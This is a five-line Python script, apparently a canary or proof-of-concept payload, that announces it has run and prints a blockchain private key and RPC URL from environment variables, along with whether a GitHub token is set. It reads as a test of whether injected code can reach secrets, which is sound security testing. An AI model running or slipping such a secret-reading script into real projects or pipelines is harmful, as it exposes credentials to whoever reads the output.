import os, sys
print("ATTACKER_SCRIPT_EXECUTED argv=", sys.argv[1:])
print("STOLEN_ANVIL_PRIVATE_KEY=" + os.environ.get("ANVIL_PRIVATE_KEY", "<unset>"))
print("STOLEN_ANVIL_URL=" + os.environ.get("ANVIL_URL", "<unset>"))
print("LEAK_GITHUB_TOKEN_present=" + str(bool(os.environ.get("GH_TOKEN"))))
